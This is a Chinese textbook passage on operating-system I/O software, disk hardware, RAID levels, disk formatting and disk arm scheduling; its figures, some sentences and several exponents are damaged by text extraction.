操作系统的一个主要问题是如何使所有I/O设备和驱动程序看起来或多或少是相同的。
如果磁盘、 打印机、键盘等接口方式都不相同，那么每次在一个新设备出现时，都必须为新设备修改操作系统。
必 须为每个新设备修改操作系统绝不是一个好主意。
设备驱动程序与操作系统其余部分之间的接口是这一问题的一个方面。
图5-14a所示为这样一种情 形：每个设备驱动程序有不同的与操作系统的接口。
这意味着，可供系统调用的驱动程序函数随驱动程 序的不同而不同。
这可能还意味着，驱动程序所需要的内核函数也是随驱动程序的不同而不同的。
综合 起来看，这意味着为每个新的驱动程序提供接口都需要大量全新的编程工作。
SATA磁盘 IDE 磁盘 SCSI 磁盘
驱动程序 驱动程序 驱动程序
a)
SATA磁盘 IDE 磁盘 SCSI 磁盘
驱动程序 驱动程序 驱动程序
b)
图5-14 a) 没有标准的驱动程序接口；b) 具有标准的驱动程序接口
如何给I/O设备命名是统一接口问题的另一个方面。
与设备无关的软件要负责把符号化的设备名映 射到适当的驱动程序上。
例如，在UNIX系统中，像/dev/disk0 这样的设备名唯一确定了一个特殊文件的i 节点，这个i节点包含了主设备号(major device number),主设备号用于定位相应的驱动程序。
节点还 包含次设备号(minor device number),次设备号作为参数传递给驱动程序，用来确定要读或写的具体 单元。
所有设备都具有主设备号和次设备号，并且所有驱动程序都是通过使用主设备号来选择驱动程序 而得到访问。
与设备命名密切相关的是设备保护。
系统如何防止无权访问设备的用户访问设备呢?
在UNIX 和 Windows中，设备是作为命名对象出现在文件系统中的，这意味着针对文件的常规的保护规则也适用于 I/O设备。
系统管理员可以为每一个设备设置适当的访问权限。
2.缓冲
用户进程
只
2
调制解调器 调制解调器 调制解调器 调制解调器
a) b) c) d)
图5-15 a) 无 缓 冲 的 输 入 ；b) 用户空间中的缓冲；c) 内核空间中的缓冲接着复制到用户空间；d) 内 核 空 间中的双缓冲
这种处理方式的问题在于：对于每个到来的字符，都必须启动用户进程。
对于短暂的数据流量让一 个进程运行许多次效率会很低，所以这不是一个良好的设计。
另一种方法是在内核空间中创建一个缓冲区并且让中断处理程序将字符放到这个缓冲区中，如图 5-15c 所示。
当该缓冲区被填满的时候，将包含用户缓冲区的页面调入内存(如果需要的话),并且在 一次操作中将内核缓冲区的内容复制到用户缓冲区中。
这一方法的效率要高很多。
然而，即使这种改进的方案也面临一个问题：正当包含用户缓冲区的页面从磁盘调入内存的时候有 新的字符到来，这样会发生什么事情?
因为缓冲区已满，所以没有地方放置这些新来的字符。
一种解 决问题的方法是使用第二个内核缓冲区。
第一个缓冲区填满之后，在它被清空之前，使用第二个缓冲 区，如图5-15d所示。
当第二个缓冲区填满时，就可以将它复制给用户(假设用户已经请求它)。
当第二 个缓冲区正在复制到用户空间的时候，第一个缓冲区可以用来接收新的字符。
以这样的方法，两个缓冲 区轮流使用：当一个缓冲区正在被复制到用户空间的时候，另一个缓冲区正在收集新的输入。
像这样的 缓冲模式称为双缓冲 (double buffering)。
缓冲对于输出也是十分重要的。
例如，对于没有缓冲区的调制解调器，我们考虑采用图5-15b的模 型输出是如何实现的。
用户进程执行write 系统调用以输出n个字符。
系统在此刻有两种选择。
它可以将 用户阻塞直到写完所有字符，但是这样做在低速的电话线上可能花费非常长的时间。
它也可以立即将用 户释放并且在进行I/O的同时让用户做某些其他计算，但是这会导致一个更为糟糕的问题：用户进程怎 样知道输出已经完成并且可以重用缓冲区?
系统可以生成一个信号或软件中断，但是这样的编程方式是 十分困难的并且被证明是竞争条件。
对于内核来说更好的解决方法是将数据复制到一个内核缓冲区中， 与图5-15c相类似(但是是另一个方向),并且立刻将调用者解除阻塞。
现在实际的I/O什么时候完成都没 有关系了，用户一旦被解除阻塞立刻就可以自由地重用缓冲区。
缓冲是一种广泛采用的技术，但是它也有不利的方面。
如果数据被缓冲太多次，性能就会降低。
例
如，考虑图5-16中的网络。
其中， 一 个用户执行了一个系统调用向网络写 数据。
内核将数据包复制到一个内核 缓冲区中，从而立即使用户进程得以 继续进行(第1步)。
在此刻，用户程 序可以重用缓冲区。
当驱动程序被调用时，它将数据 包复制到控制器上以供输出(第2步)。
它不是将数据包从内核内存直接输出 到网线上，其原因是一旦开始一个数 据包的传输，它就必须以均匀的速度 继续下去，驱动程序不能保证它能够
网络
图5-16 可能涉及多次复制一个数据包的网络
以均匀的速度访问内存，因为DMA通道与其他I/O 设备可能正在窃取许多周期。
不能及时获得一个字将 毁坏数据包，而通过在控制器内部对数据包进行缓冲就可以避免这一问题。
当数据包复制到控制器的内部缓冲区中之后，它就会被复制到网络上(第3步)。
数据位被发送之后立 刻就会到达接收器，所以在最后一位刚刚送出之后，该位就到达了接收器，在这里数据包在控制器中被缓
冲。
接下来，数据包复制到接收器的内核缓冲区中(第4步)。
最后，它被复制到接收进程的缓冲区中(第 5步)。
然后接收器通常会发回一个应答。
当发送者得到应答时，它就可以自由地发送下一个数据包。
然而， 应该清楚的是，所有这些复制操作都会在很大程度上降低传输速率，因为所有这些步骤必须有序地发生。
3. 错误报告
错误在I/O上下文中比在其他上下文中要常见得多。
当错误发生时，操作系统必须尽最大努力对它们进 行处理。
许多错误是设备特定的并且必须由适当的驱动程序来处理，但是错误处理的框架是设备无关的。
一种类型的I/O错误是编程错误，这些错误发生在一个进程请求某些不可能的事情时，例如写一个输 入设备(键盘、扫描仪、鼠标等)或者读一个输出设备(打印机、绘图仪等)。
其他的错误包括提供了一 个无效的缓冲区地址或者其他参数，以及指定了一个无效的设备(例如，当系统只有两块磁盘时指定了 磁盘3),如此等等。
在这些错误上采取的行动是直截了当的：只是将一个错误代码报告返回给调用者。
另一种类型的错误是实际的I/O错误，例如，试图写一个已经被破坏的磁盘块，或者试图读一个已 经关机的便携式摄像机。
在这些情形中，应该由驱动程序决定做什么。
如果驱动程序不知道做什么,它 应该将问题向上传递，返回给与设备无关的软件。
软件要做的事情取决于环境和错误的本质。
如果是一个简单的读错误并且存在一个交互式的用户可 利用，那么它就可以显示一个对话框来询问用户做什么。
选项可能包括重试一定的次数，忽略错误，或 者杀死调用进程。
如果没有用户可利用，唯一的实际选择或许就是以一个错误代码让系统调用失败。
然而，某些错误不能以这样的方式来处理。
例如，关键的数据结构(如根目录或空闲块列表)可能 已经被破坏，在这种情况下，系统也许只好显示一条错误消息并且终止，并不存在多少其他事情可以做。
4.分配与释放专用设备
某些设备，例如打印机，在任意给定的时刻只能由一个进程使用。
这就要求操作系统对设备使用的 请求进行检查，并且根据被请求的设备是否可用来接受或者拒绝这些请求。
处理这些请求的一种简单方 法是要求进程在代表设备的特殊文件上直接执行open 操作。
如果设备是不可用的，那么open 就会失败。
于是就关闭这样的一个专用设备，然后将其释放。
一种代替的方法是对于请求和释放专用设备要有特殊的机制。
试图得到不可用的设备可以将调用者 阻塞，而不是让其失败。
阻塞的进程被放入一个队列。
迟早被请求的设备会变得可用，这时就可以让队 列中的第一个进程得到该设备并且继续执行。
5.与设备无关的块大小
不同的磁盘可能具有不同的扇区大小。
应该由与设备无关的软件来隐藏这一事实并且向高层提供一 个统一的块大小，例如，将若干个扇区当作一个逻辑块。
这样，高层软件就只需处理抽象的设备，这些 抽象设备全部都使用相同的逻辑块大小，与物理扇区的大小无关。
类似地，某些字符设备(如鼠标)一 次一个字节地交付它们的数据，而其他的设备(如网络接口)则以较大的单位交付它们的数据。
这些差 异也可以被隐藏起来。
5.3.4 用户空间的I/O 软件
尽管大部分I/O 软件都在操作系统内部，但是仍然有一小部分在用户空间，包括与用户程序连接在 一起的库，甚至完全运行于内核之外的程序。
系统调用(包括I/O 系统调用)通常由库过程实现。
当一 个C程序包含调用
count=write(fd,buffer,nbytes);
时，库过程write将与该程序连接在一起，并包含在运行时出现在内存中的二进制程序中。
所有这些库过 程的集合显然是I/O系统的组成部分。
虽然这些过程所做的工作不过是将这些参数放在合适的位置供系统调用使用，但是确有其他I/O 过 程实际实现真正的操作。
输入和输出的格式化是由库过程完成的。
一个例子是C语言中的printf, 它以 一 个格式串和可能的一些变量作为输入，构造一个ASCII字符串，然后调用write以输出这个串。
作为printf 的一个例子，考虑语句
printf("The square of %3d is%6d\n",i,i*i);
该语句格式化一个字符串，该字符串是这样组成的：先是14个字符的串 “The square of”(注意of后有
一个空格),随后是i 值作为3个字符的串，然后是4个字符的串“is” (注意前后各有一个空格),然后是f² 值作为6个字符的串，最后是一个换行。
对输入而言，类似过程的一个例子是scanf, 它读取输入并将其存放到一些变量中，采用与printf 同 样语法的格式串来描述这些变量。
标准的I/O 库包含许多涉及I/O 的过程，它们都是作为用户程序的一部 分运行的。
并非所有的用户层I/O 软件都是由库过程组成的。
另 一 个重要的类别是假脱机系统。
假 脱 机 (spooling) 是多道程序设计系统中处理独占I/O 设备的一种方法。
考虑一种典型的假脱机设备：打印机。
尽管在技术上可以十分容易地让任何用户进程打开表示该打印机的字符特殊文件，但是假如一个进程打 开它，然后很长时间不使用，则其他进程都无法打印。
另一种方法是创建一个特殊进程，称为守护进程 (daemon), 以及 一 个特殊目录，称为 假脱机目录 (spooling directory)。
一个进程要打印一个文件时，首先生成要打印的整个文件，并且将其放在假脱机
目录下。
由守护进程打印该目录下的文件，该进程是允许使用打印机特殊文件的唯一进程。
通过保护特
殊文件来防止用户直接使用，可以解决某些进程不必要地长期空占打印机的问题。
假脱机不仅仅用于打印机，还可以在其他情况下使用。
例如，通过网络传输文件常常使用一个网络 守护进程。
要发送一个文件到某个地方，用户可以将该文件放在一个网络假脱机目录下。
稍后，由网络 守护进程将其取出并且发送出去。
这种假脱机文件传输方式的一个特定用途是USENET 新闻系统(现在 是Google Groups的一部分),该网络由世界上使用因特网进行通信的成千上万台计算机组成，针对许多 话题存在着几千个新闻组。
要发送一条新闻消息，用户可以调用新闻程序，该程序接收要发出的消息， 然后将其存放在假脱机目录中，待以后发送到其他计算机上。
整个新闻系统是在操作系统之外运行的。
图5-17对I/O 系统进行了总结，给出了所有层次以及每一层的主要功能。
从底部开始，这些层是硬
件、中断处理程序、设备驱动程序、与设 备无关的软件，最后是用户进程。
图5-17中的箭头表明了控制流。
例如， 当一个用户程序试图从一个文件中读一个 块时，操作系统被调用以实现这一请求。
与设备无关的软件在缓冲区高速缓存中查 找有无要读的块。
如果需要的块不在其中， 则调用设备驱动程序，向硬件发出一个请 求，让它从磁盘中获取该块。
然后，进程 被阻塞直到磁盘操作完成并且数据在调用 者的缓冲区中安全可用。
当磁盘操作完成时，硬件产生一个中 断。
中断处理程序就会运行，它要查明发
I/O
请求
层次 I/O应答 I/O功能
产生I/O 请求；对I/O进行格 式化；假脱机
命名、保护、分块、缓冲、 分配
设置设备寄存器；检查状态 当I/O完成时唤醒驱动程序 执行I/O操作
图5-17 I/O 系统的层次以及每一层的主要功能
生了什么事情，也就是说此刻需要关注哪个设备。
然后，中断处理程序从设备提取状态信息，唤醒休眠 的进程以结束此次I/O 请求，并且让用户进程继续运行。
5.4 盘
现在我们开始研究某些实际的I/O 设备。
我们将从盘开始，盘的概念简单，但是非常重要。
然后， 我们将研究时钟、键盘和显示器。
5.4.1 盘硬件
盘具有多种多样的类型。
最为常用的是磁盘，它们具有读写速度同样快的特点，这使得它们适合作 为辅助存储器(用于分页、文件系统等)。
这些盘的阵列有时用来提供高可靠性的存储器。
对于程序、 数据和电影的发行而言，光盘 (DVD 和蓝光光盘)也非常重要。
最后，固态盘越来越流行，它们速度快 并且不包含运动的部件。
在下面几节中，我们将讨论磁盘，以此作为硬件的例子，然后对磁盘设备的软 件进行一般性的描述。
1.磁盘
磁盘被组织成柱面，每一个柱面包含若干磁道，磁道数与垂直堆叠的磁头个数相同。
磁道又被分成 若干扇区，软盘上大约每条磁道有8～32个扇区，硬盘上每条磁道上扇区的数目可以多达几百个。
磁头 数大约是1～16个。
老式的磁盘只有少量的电子设备，它们只是传送简单的串行位流。
在这些磁盘上，控制器做了大部 分的工作。
在其他磁盘上，特别是在IDE(Integrated Drive Electronics,集成驱动电子设备)和SATA (Serial ATA,串 行ATA) 盘上，磁盘驱动器本身包含一个微控制器，该微控制器承担了大量的工作并且 允许实际的控制器发出一组高级命令。
控制器经常做磁道高速缓存、坏块重映射以及更多的工作。
对磁盘驱动程序有重要意义的一个设备特性是：控制器是否可以同时控制两个或多个驱动器进行寻 道，这就是重叠寻道 (overlapped seek)。
当控制器和软件等待一个驱动器完成寻道时，控制器可以同时 启动另一个驱动器进行寻道。
许多控制器也可以在一个驱动器上进行读写操作，与此同时再对另一个或 多个其他驱动器进行寻道，但是软盘控制器不能在两个驱动器上同时进行读写操作。
(读写数据要求控 制器在微秒级时间尺度传输数据，所以一次传输就用完了控制器大部分的计算能力。
)对于具有集成控 制器的硬盘而言情况就不同了，在具有一个以上这种硬盘驱动器的系统上，它们能够同时操作，至少在 磁盘与控制器的缓冲存储器之间进行数据传输的限度之内是这样。
然而，在控制器与主存之间可能同时 只有一次传输。
同时执行两个或多个操作的能力极大地降低了平均存取时间。
图5-18比较了最初的IBM PC标准存储介质的参数与30年后制造的磁盘的参数，从中可以看出这 段时间里磁盘发生了多大的变化。
有趣的是，可以注意到并不是所有的参数都具有同样程度的改进。
平 均寻道时间改进了差不多9倍，传输率改进了16000倍，而容量的改进则高达800000倍。
这一格局主要 是因为磁盘中运动部件的改进相对来说和缓渐进，而记录表面则达到了相当高的位密度。
图5-18 最初的IBM PC 360-KB软盘参数与西部数据公司WD 3000 HLFS(Velociraptor,速龙)硬盘参数
为了隐藏每个磁道有多少扇区的细节，大多数现代磁盘都有一个虚拟几何规格呈现给操作系统。
软 件在工作时仿佛存在着x个柱面、y 个磁头、每磁道z个扇区，而控制器则将对(x,y,z) 的请求重映射到实 际的柱面、磁头和扇区。
对于图5-19a中的物理磁盘，一种可能的虚拟几何规格如图5-19b所示。
在两种 情形中磁盘拥有的扇区数都是192,只不过公布的排列与实际的排列是不同的。
对于PC而言，上述三个参数的最大值常常是(65535,16,63),这是因为需要与最初IBM PC的限 制向后兼容。
在IBM PC器上，使用16位、4位和6位的字段来设定这些参数，其中柱面和扇区从1开始编
号，磁头从0开始编号。
根据这些参数以及每个扇区512字节可知，磁盘最大可能的容量是31.5GB。
为 突 破这一限制，所有现代磁盘现在都支持一种称为逻辑块寻址 (logical block addressing,LBA) 的系统， 在这样的系统中，磁盘扇区从0开始连续编号，而不管磁盘的几何规格如何。
a)
E1 乙
b)
图5-19 a) 具有两个环带的磁盘的物理几何规格； b) 该磁盘的一种可能的虚拟几何规格
2.RAID
在过去十多年里，CPU 的性能一直呈现出指数增长，大体上每18个月翻一番。
但是磁盘的性能就不 是这样了。
20世纪70年代，小型计算机磁盘的平均寻道时间是50～100毫秒，现在的寻道时间略微低于 10毫秒。
在大多数技术产业(如汽车业或航空业)中，在20年之内有5～10倍的性能改进就将是重大的 新闻(想象300 MPG 的轿车甲),但是在计算机产业中，这却是一个窘境。
因此，CPU 性 能 与 ( 硬 ) 盘 性能之间的差距随着时间的推移将越来越大。
对此我们能做些有帮助的事情吗?
是的!
正如我们已经看到的，为了提高CPU的性能，越来越多地使用了并行处理。
在过去许多年，很 多人也意识到并行I/O 是一个很好的思想。
Patterson 等人在他们1988年写的文章中提出，使用六种特殊的磁 盘组织可能会改进磁盘的性能、可靠性或者同时改进这两者 (Patterson 等人，1988)。
这些思想很快被工 业界所采纳，并且导致称为RAID 的一种新型I/O 设备的诞生。
Patterson 等人将RAID 定义为Redundant Array of Inexpensive Disk (廉价磁盘冗余阵列),但是工业界将I重定义为Independent (独立)而不是 Inexpensive (廉价),或许这样他们就可以收取更多的费用?
因为反面角色也是需要的(如同RISC对CISC, 这也是源于Patterson), 此处的“坏家伙”是SLED(Single Large Expensive Disk,单个大容量昂贵磁盘)。
除了对软件而言看起来就像是一个磁盘以外，所有的RAID 都具有同样的特性，那就是将数据分布 在全部驱动器上，这样就可以并行操作。
Patterson 等人为这样的操作定义了几种不同的模式。
如今，大 多数制造商将七种标准配置称为0级RAID 到6级RAID 。
此外，还有少许其他的辅助层级，我们就不讨论 了。
“层级”这一术语多少有一些用词不当，因为此处不存在分层结构，它们只是可能的七种不同组织 形式而已。
0级RAID如图5-20a所示。
它将RAID模拟的虚拟单个磁盘划分成条带，每个条带具有k个扇区，其 中扇区0~k-1 为条带0,扇区k~2k-1 为条带1,以此类推。
如果k=1, 则每个条带是一个扇区；如果k=
2,则每个条带是两个扇区；以此类推。
0级RAID 结构将连续的条带以轮转方式写到全部驱动器上， 图5-20a所示为具有四个磁盘驱动器的情形。
像这样将数据分布在多个驱动器上称为划分条带 (striping) 。
例如，如果软件发出一条命令，读取 一个由四个连续条带组成的数据块，并且数据块起始于条带边界，那么RAID 控制器就会将该命令分解 为四条单独的命令，每条命令对应四块磁盘中的一块，并且让它们并行操作。
这样我们就运用了并行 I/O而软件并不知道这一切。
0级RAID对于大数据量的请求工作性能最好，数据量越大性能就越好。
如果请求的数据量大于驱动 器数乘以条带大小，那么某些驱动器将得到多个请求，这样当它们完成了第一个请求之后，就会开始处 理第二个请求。
控制器的责任是分解请求，并且以正确的顺序将适当的命令提供给适当的磁盘，之后还 要在内存中将结果正确地装配起来。
0级RAID的性能是杰出的而实现是简单明了的。
对于习惯于每次请求一个扇区的操作系统，0级RAID工作性能最为糟糕。
虽然结果会是正确的，但 是却不存在并行性，因此也就没有增进性能。
这一结构的另一个劣势是其可靠性潜在地比SLED 还要差。
如果一个RAID由四块磁盘组成，每块磁盘的平均故障间隔时间是20000小时，那么每隔5000小时就会 有一个驱动器出现故障并且所有数据将完全丢失。
与之相比，平均故障间隔时间为20000小时的SLED 的可靠性要高出四倍。
由于在这一设计中未引入冗余，实际上它还不是真正的RAID。
下一个选择——1级RAID如图5-20b所示，这是一个真正的RAID 。
它复制了所有的磁盘，所以存在 四个主磁盘和四个备份磁盘。
在执行一次写操作时，每个条带都被写了两次。
在执行一次读操作时，则 可以使用其中的任意一个副本，从而将负荷分布在更多的驱动器上。
因此，写性能并不比单个驱动器好， 但是读性能能够比单个驱动器高出两倍。
容错性是突出的：如果一个驱动器崩溃了，只要用副本来替代 就可以了。
恢复也十分简单，只要安装一个新驱动器并且将整个备份驱动器复制到其上就可以了。
不利的一面是，这一方案要求所有驱动器的旋转必须同步，并且只有在驱动器数量很充裕的情况下 才有意义(即使对于32个数据驱动器和6个奇偶驱动器而言，也存在19%的开销)。
这一方案还对控制器 提出许多要求，因为它必须在每个位时间里求汉明校验和。
3级RAID 是2级RAID 的简化版本，如图5-20d所示。
其中要为每个数据字计算一个奇偶校验位并且 将其写入一个奇偶驱动器中。
与2级RAID一样，各个驱动器必须精确地同步，因为每个数据字分布在多 个驱动器上。
乍一想，似乎单个奇偶校验位只能检测错误，而不能纠正错误。
对于随机的未知错误的情形，这样 的看法是正确的。
然而，对于驱动器崩溃这样的情形，由于坏位的位置是已知的，所以这样做完全能够纠 正1位错误。
如果发生了一个驱动器崩溃的事件，控制器只需假装该驱动器的所有位为0,如果一个字有奇 偶错误，那么来自废弃了的驱动器上的位原来一定是1,这样就纠正了错误。
尽管2级RAID和3级RAID两 者都提供了非常高的数据率，但是每秒钟它们能够处理的单独的I/O请求的数目并不比单个驱动器好。
4级RAID 和5级RAID 再次使用条带，而不是具有奇偶校验的单个字。
如图5-20e所示，4级RAID与0 级RAID相类似，但是它将条带对条带的奇偶条带写到一个额外的磁盘上。
例如，如果每个条带k字节长， 那么所有的条带进行异或操作，就得到一个k字节长的奇偶条带。
如果一个驱动器崩溃了，则损失的字 节可以通过读出整个驱动器组从奇偶驱动器重新计算出来。
这一设计对一个驱动器的损失提供了保护，但是对于微小的更新其性能很差。
如果一个扇区被修改
了，那么就必须读取所有的驱动器以便重新计算奇偶校验，然后还必须重写奇偶校验。
作为另一选择， 它也可以读取旧的用户数据和旧的奇偶校验数据，并且用它们重新计算新的奇偶校验。
即使是对于这样 的优化，微小的更新也还是需要两次读和两次写。
结果，奇偶驱动器的负担十分沉重，它可能会成为一个瓶颈。
通过以循环方式在所有驱动器上均匀 地分布奇偶校验位，5级RAID 消除了这一瓶颈，如图5-20f所示。
然而，如果一个驱动器发生崩溃，重新 构造故障驱动器的内容是一个非常复杂的过程。
条带0 条带4 条带8
条带1 条带5 条带9
条带2
条带6
条带10
a)
条带3 条带7 条带11
0级RAID
位1 位2
位3 位4 位5
位6 位7
2级RAID
c)
位1 位2 位3 位4 奇 偶
3级RAID
d)
图5 - 200级RAID 到6级RAID (备份驱动器和奇偶驱动器以阴影显示)
6级RAID与5级RAID相似，区别在于前者使用了额外的奇偶块。
换句话说，跨磁盘分条带的数据具 有两个奇偶块，而不是一个奇偶块。
结果，写的代价要更高一点，因为要做奇偶计算，但是读不会招致 任何性能惩罚。
它确实能够提供更高的可靠性(想象一下当5级RAID正在重建其阵列时如果遭遇一个坏 块会发生什么事情)。
5.4.2 磁盘格式化
硬盘由一叠铝的、合金的或玻璃的盘片组成，典型的直径为3.5英寸(或者在笔记本电脑上是2.5英 寸)。
在每个盘片上沉积着薄薄的可磁化的金属氧化物。
在制造出来之后，磁盘上不存在任何信息。
在磁盘能够使用之前，每个盘片必须经受由软件完成的低级格式化(low-level format)。
该格式包含 一系列同心的磁道，每个磁道包含若干数目的扇区，扇区间存在短的间隙。
一个扇区的格式如图5-21所示。
前导码以一定的位模式开始，位模式使硬件得以识别扇区的开始。
前导码还包含柱面与扇区号以及
某些其他信息。
数据部分的大小是由低级格 式化程序决定的，大多数磁盘使用512字节 的扇区。
ECC 域包含冗余信息，可以用来恢 复读错误。
该域的大小和内容随生产商的不 同而不同，它取决于设计者为了更高的可靠 性愿意放弃多少磁盘空间以及控制器能够处 理的ECC编码有多复杂。
16字节的ECC域并 不是罕见的。
此外，所有硬盘都分配有某些 数目的备用扇区，用来取代具有制造瑕疵的 扇区。
在设置低级格式时，每个磁道上第0扇 区的位置与前一个磁道存在偏移。
这一偏移 称为柱面斜进 (cylinder skew),这样做是为 了改进性能，想法是让磁盘在一次连续的 操作中读取多个磁道而不丢失数据。
观察 图5-19a就可以明白问题的本质。
假设一个读 请求需要最内侧磁道上从第0扇区开始的18 个扇区，磁盘旋转一周可以读取前16个扇区， 但是为了得到第17个扇区，则需要一次寻道 操作以便磁头向外移动一个磁道。
到磁头移 动了一个磁道时，第0扇区已经转过了磁头， 所以需要旋转一整周才能等到它再次经过磁 头。
通过图5-22所示的将扇区偏移即可消除 这一问题。
图5-21 一个磁盘扇区
磁盘旋 转方向
图5-22 柱面斜进示意图
柱面斜进量取决于驱动器的几何规格。
例如，一个10000rpm的驱动器每6ms旋转一周，如果一个 磁道包含300个扇区，那么每20μs就有一个新扇区在磁头下通过。
如果磁道到磁道的寻道时间是800 μs, 那么在寻道期间将有40个扇区通过，所以柱面斜进应该是40个扇区而不是图5-22中的三个扇区。
值得一 提的是，像柱面斜进一样也存在着磁头斜进 (head skew), 但是磁头斜进不是很大，通常远小于一个扇 区的时间。
低级格式化的结果是磁盘容量减少，减少的量取决于前导码、扇区间间隙和ECC的大小以及保留的 备用扇区的数目。
通常格式化的容量比未格式化的容量低20%。
备用扇区不计入格式化的容量，所以一 种给定类型的所有磁盘在出厂时具有完全相同的容量，与它们实际具有多少坏扇区无关(如果坏扇区的 数目超出了备用扇区的数目，则该驱动器是不合格的，不会出厂)。
关于磁盘容量存在着相当大的混淆，这是因为某些制造商广告宣传的是未格式化的容量，从而使他 们的驱动器看起来比实际的容量要大。
例如，考虑一个未格式化容量为200×10⁹字节的驱动器，它或许
为避免混淆，有些作者使用前缀kilo 、mega 、giga 和tera 分别表示10³、10⁶、10⁹和10¹²,使用kibi、 mebi 、gibi 和tebi分别表示21⁰、22、230和2。
然而，前缀 “b” 的使用是比较少的。
以防万一你实在喜欢 大数字，我再介绍一下，跟随在tebi 之后的前缀是pebi 、exbi 、zebi 和yobi, 所 以yobibyte 是一大串字节 (精确地说是28字节)。
格式化还对性能产生影响。
如果一个10000RPM的磁盘每个磁道有300个扇区，每个扇区512字节， 那么用6ms可以读出一个磁道上的153600字节，使数据率为25600000字节/秒或24.4 MB/s 。
不论引入 什么种类的接口，都不可能比这个速度更快，即便是80 MB/s 或160 MB/s的SCSI 接口也不行。
实际上，以这一速率连续地读磁盘要求控制器中有一个大容量的缓冲区。
例如，考虑一个控制器， 它具有一个扇区的缓冲区，该控制器接到一条命令要读两个连续的扇区。
当从磁盘上读出第一个扇区并 做了ECC 计算之后，数据必须传送到主存中。
就在传送正在进行时，下一个扇区将从磁头下通过。
当完 成了向主存的复制时，控制器将不得不等待几乎一整周的旋转时间才能等到第二个扇区再次回来。
通过在格式化磁盘时以交错方式对扇区进行编号可以消除这一问题。
在图5-23a中，我们看到的是 通常的编号模式(此处忽略柱面斜进)。
在图5-23b中，我们看到的是单交错 (single interleaving),它 可 以在连续的扇区之间给控制器以喘息的空间以便将缓冲区复制到主存。
a) b) c)
图5-23 a) 无交错；b) 单交错；c) 双交错
如果复制过程非常慢，可能需要如图5-23c中的双交错(dou ble interleaving)。
如果控制器拥有的缓 冲区只有一个扇区，那么从缓冲区到主存的复制无论是由控制器完成还是由主CPU 或者DMA芯片完成 都无关紧要，都要花费某些时间。
为了避免需要交错，控制器应该能够对整个磁道进行缓存。
大多数现 代控制器都能够对多个整磁道进行缓冲。
在低级格式化完成之后，要对磁盘进行分区。
在逻辑上，每个分区就像是一个独立的磁盘。
分区对 于实现多个操作系统共存是必需的。
此外，在某些情况下，分区可以用来进行交换。
在x86和大多数其 他计算机上，0扇区包含主引导记录(Master Boot Record,MBR), 它包含某些引导代码以及处在扇区 末尾的分区表。
MBR以及对于分区表的支持于1983年首次出现在IBM PC中，以支持PC XT中在当时看 来是大容量的10MB硬盘驱动器。
从那以后，磁盘一直在成长。
因为在大多数系统中MBR分区表项限于 32位，所以对于512B扇区的磁盘而言，能够支持的最大磁盘大小是2TB。
由于这一原因，大多数操作 系统现在支持新的GPT(GUID Partition Table,GUID分区表),它可以支持的磁盘大小高达9.4ZB (9444732965739290426880字节)。
在本书出版之时，这会被认为是很多的字节。
在准备一块磁盘以便于使用的最后一步是对每一个分区分别执行一次高级格式化 (high-level
format) 。
这一操作要设置一个引导块、空闲存储管理(空闲列表或位图)、根目录和一个空文件系统。
这一操作还要将一个代码设置在分区表项中，以表明在分区中使用的是哪个文件系统，因为许多操作系 统支持多个兼容的文件系统(由于历史原因)。
这时，系统就可以引导了。
当电源打开时，BIOS 最先运行，它读入主引导记录并跳转到主引导记录。
然后这一引导程序进行 检查以了解哪个分区是活动的。
引导扇区包含一个小的程序，它一般会装入一个较大的引导程序装载器， 该引导程序装载器将搜索文件系统以找到操作系统内核。
该程序被装入内存并执行。
5.4.3 磁盘臂调度算法
本小节我们将一般地讨论与磁盘驱动程序有关的几个问题。
首先，考虑读或者写一个磁盘块需要多 长时间。
这个时间由以下三个因素决定：
1)寻道时间(将磁盘臂移动到适当的柱面上所需的时间)。
2)旋转延迟(等待适当扇区旋转到磁头下所需的时间)。
3)实际数据传输时间。
对大多数磁盘而言，寻道时间与另外两个时间相比占主导地位，所以减少平均寻道时间可以充分地 改善系统性能。
Served,FCFS), 则很难优化寻道时间。
然而，当磁盘负载很重时，可以采用其他策略。
很有可能当磁 盘臂为一个请求寻道时，其他进程会产生其他磁盘请求。
许多磁盘驱动程序都维护着一张表，该表按柱 面号索引，每一柱面的未完成的请求组成一个链表，链表头存放在表的相应表目中。
图5-24 最短寻道优先 (SSF) 磁盘调度算法
当前请求(请求柱面11)结束后，磁盘驱动程序要选择下一次处理哪一个请求。
若使用FCFS算法， 则首先选择柱面1,然后是36,以此类推。
这个算法要求磁盘臂分别移动10、35、20、18、25和3个柱面， 总共需要移动111个柱面。
另一种方法是下一次总是处理与磁头距离最近的请求以使寻道时间最小化。
对于图5-24中给出的请 求，选择请求的顺序如图5-24中下方的折线所示，依次为12、9、16、1、34和36。
按照这个顺序，磁盘 臂分别需要移动1、3、7、15、33和2个柱面，总共需要移动61个柱面。
这个算法即最短寻道优先 (Shortest Seek First,SSF),与FCFS算法相比，该算法的磁盘臂移动几乎减少了一半。
但 是 ，SSF 算法存在一个问题。
假设当图5-24所示的请求正在处理时，不断地有其他请求到达。
例 如，磁盘臂移到柱面16以后，到达一个对柱面8的新请求，那么它的优先级将比柱面1要高。
如果接着又 到达了一个对柱面13的请求，磁盘臂将移到柱面13而不是柱面1。
如果磁盘负载很重，那么大部分时间
然而，大多数电梯使用一种不同的算法来协调效率和公平性这两个相互冲突的目标。
电梯保持按一 个方向移动，直到在那个方向上没有请求为止，然后改变方向。
这个算法在磁盘世界和电梯世界都被称 为电梯算法(elevator algorithm),它需要软件维护一个二进制位，即当前方向位：UP (向上)或是 DOWN (向下)。
当一个请求处理完之后，磁盘或电梯的驱动程序检查该位，如果是UP, 磁盘臂或电梯 舱移至下一个更高的未完成的请求。
如果更高的位置没有未完成的请求，则方向位取反。
当方向位设置 为DOWN时，同时存在一个低位置的请求，则移向该位置。
如果不存在未决的请求，那么它只是停止并 等待。
图5-25 调度磁盘请求的电梯算法
某些磁盘控制器提供了一种方法供软件检查磁头下方的当前扇区号。
对于这种磁盘控制器，还可以 进行另一种优化。
如果针对同一柱面有两个或多个请求正等待处理，驱动程序可以发出请求读写下一次 要通过磁头的扇区。
注意，当一个柱面有多条磁道时，相继的请求可能针对不同的磁道，故没有任何代 价。
因为选择磁头既不需要移动磁盘臂也没有旋转延迟，所以控制器几乎可以立即选择任意磁头。
如果磁盘具有寻道时间比旋转延迟快很多的特性，那么应该使用不同的优化策略。
未完成的请求应 该按扇区号排序，并且当下一个扇区就要通过磁头的时候，磁盘臂应该飞快地移动到正确的磁道上对其 进行读或者写。
对于现代硬盘，寻道和旋转延迟是如此影响性能，所以一次只读取一个或两个扇区的效率是非常低 下的。
由于这个原因，许多磁盘控制器总是读出多个扇区并对其进行高速缓存，即使只请求一个扇区时 也是如此。
